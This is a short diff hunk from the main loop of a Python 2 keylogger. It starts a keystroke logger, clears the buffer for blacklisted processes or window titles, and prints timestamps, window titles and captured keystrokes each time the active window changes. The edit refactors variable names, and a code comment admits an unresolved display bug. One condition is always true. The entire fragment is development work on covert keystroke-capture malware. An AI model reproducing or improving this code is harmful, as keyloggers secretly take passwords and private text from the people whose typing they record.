@@ -162,15 +162,14 @@ if __name__=="__main__":
 	keyLogger.start()
 	while True:
 		exe, win_title = get_current_process()
-		curr_title = set(win_title.lower().split())
-		if (exe.lower() in proc_blacklist) or (title_blacklist & curr_title):
+		curr_title_split = set(win_title.lower().split())
+		if (exe.lower() in proc_blacklist) or (title_blacklist & curr_title_split):
 			keyLogger.keys_buffer = ""
 		elif keyLogger.keys_buffer == "":
 			pass
 		else:
-			curr_title = get_current_process()[1]
-			if current_window != curr_title:
+			if current_window != win_title:
 				if (current_window != '') or (current_window != 'Task Switching'):
-					print datetime.datetime.now(),curr_title,current_window #this part annoying, and needs a fix
+					print datetime.datetime.now(),current_window # one issue here, prints datetime line with no current window title when switching windows with first character of dump. i stare at this too long and now i cant figure out
 					print keyLogger.dump()
-					current_window = curr_title
+					current_window = win_title
